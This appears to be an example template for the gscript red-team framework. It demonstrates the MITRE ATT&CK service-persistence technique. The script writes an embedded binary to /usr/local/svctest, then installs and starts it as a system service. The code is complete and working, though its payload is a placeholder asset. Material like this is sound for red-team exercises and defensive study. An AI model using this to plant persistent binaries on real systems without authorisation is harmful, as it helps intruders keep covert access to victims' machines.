// Example gscript template
// Title: x/svc Service Persistence Example
// Author: ahhh
// Purpose: Uses the experemental svc library to install a service for persistence 
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1050

//priority:170
//timeout:170

//go_import:github.com/gen0cide/gscript/x/svc as svc

//import:/private/tmp/example_svc.bin

var service_bin_path = "/usr/local/svctest";

var serviceSettings = {
  name: "gscript_example_service",
  display_name: "ges",
  description: "gscript example service",
  arguments: [],
  executable_path: service_bin_path,
  working_directory: "/usr/local/",
  options: {}
}

function Deploy() {  
    console.log("Starting gscript x/svc persistence example");

    console.log("Writing binary to disk...");
    var filedata = GetAssetAsBytes("example_svc.bin");
    var errchk = G.file.WriteFileFromBytes(service_bin_path, filedata[0]);
    if (errchk !== undefined) {
        console.error("Error writing file: " + errchk.Error());
        DebugConsole();
        return false;
    }
  
    console.log("Creating new service object...");  
    var svcObj = svc.NewFromJSON(serviceSettings);
    if (svcObj[1] !== undefined) {
        console.error("Error creating service: " + svcObj[1].Error());
        DebugConsole();
        return false;
    }
  
    console.log("Checking service config sanity...");
    var confchk = svcObj[0].CheckConfig(true);
    if (confchk[1] !== undefined || confchk[0] === false) {
        console.error("Error checking config: " + confchk[1].Error());
        DebugConsole();
        return false;
    }
  
    console.log("Installing service...");
    installchk = svcObj[0].Install(true);
    if (installchk !== undefined) {
        console.error("Error installing service: " + installchk.Error());
        DebugConsole();
        return false;
    }
  
    console.log("Starting service...");
    startchk = svcObj[0].Start();
    if (startchk !== undefined) {
        console.error("Error starting service: " + startchk.Error());
        DebugConsole();
        return false;
    }
    
    console.log("Done gscript x/svc persistence example");
    //DebugConsole();
    return true;
}

